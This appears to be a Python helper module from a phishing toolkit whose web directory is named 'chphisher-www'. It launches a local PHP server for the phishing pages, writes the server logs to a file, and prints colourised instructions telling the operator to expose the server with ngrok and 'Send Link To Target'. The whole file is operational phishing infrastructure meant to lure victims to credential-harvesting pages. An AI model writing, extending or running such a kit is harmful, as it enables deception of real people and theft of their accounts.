import subprocess
from modules.log import createLogMD5
from colorama import Fore, Back, Style, init
init()



def run_php_server(port):
    with open(f"log/php-{createLogMD5()}.log","w") as php_log:
        subprocess.Popen(("php","-S",f"localhost:{port}","-t","chphisher-www"),stderr=php_log,stdout=php_log)

    print(f"{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}] {Fore.LIGHTGREEN_EX}Web Panel Link : {Fore.LIGHTRED_EX}http://localhost:{port}")
    print(f"{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}]{Fore.LIGHTCYAN_EX} Run NGROK On Port {port} AND Send Link To Target > "+Fore.YELLOW+Back.BLACK+f"ngrok http {port}\n"+Style.RESET_ALL)